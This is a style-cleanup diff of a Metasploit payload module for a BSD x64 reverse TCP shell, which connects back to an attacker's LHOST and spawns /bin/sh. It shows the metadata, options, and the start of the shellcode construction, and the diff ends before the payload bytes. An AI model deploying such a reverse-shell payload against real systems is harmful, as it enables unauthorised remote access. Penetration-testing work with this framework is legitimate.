@@ -1,14 +1,13 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 
 module MetasploitModule
-
   CachedSize = 98
 
   include Msf::Payload::Single
@@ -17,27 +16,27 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'BSD x64 Shell Reverse TCP',
-      'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        => [
-        'nemo <nemo[at]felinemenace.org>',
-        'joev' # copy pasta monkey
-      ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'bsd',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix
-    ))
+                     'Name'          => 'BSD x64 Shell Reverse TCP',
+                     'Description'   => 'Connect back to attacker and spawn a command shell',
+                     'Author'        => [
+                       'nemo <nemo[at]felinemenace.org>',
+                       'joev' # copy pasta monkey
+                     ],
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'bsd',
+                     'Arch'          => ARCH_X64,
+                     'Handler'       => Msf::Handler::ReverseTcp,
+                     'Session'       => Msf::Sessions::CommandShellUnix))
 
     # exec payload options
 
     register_options(
       [
-        OptString.new('CMD',   [ true,  "The command string to execute", "/bin/sh" ]),
+        OptString.new('CMD', [ true, "The command string to execute", "/bin/sh" ]),
         Opt::LHOST,
         Opt::LPORT(4444)
-    ], self.class)
+      ], self.class
+    )
   end
 
   # build the shellcode payload dynamically based on the user-provided CMD
@@ -45,13 +44,13 @@ module MetasploitModule
     lhost = datastore['LHOST'] || '127.0.0.1'
 
     # OptAddress allows either an IP or hostname, we only want IPv4
-    if not Rex::Socket.is_ipv4?(lhost)
+    unless Rex::Socket.is_ipv4?(lhost)
       raise ArgumentError, "LHOST must be in IPv4 format."
     end
 
     cmd  = (datastore['CMD'] || '') + "\x00"
     port = [datastore['LPORT'].to_i].pack('n')
-    ipaddr = [lhost.split('.').inject(0) {|t,v| (t << 8 ) + v.to_i}].pack("N")
+    ipaddr = [lhost.split('.').inject(0) { |t, v| (t << 8) + v.to_i }].pack("N")
 
     call = "\xe8" + [cmd.length].pack('V')
     payload =
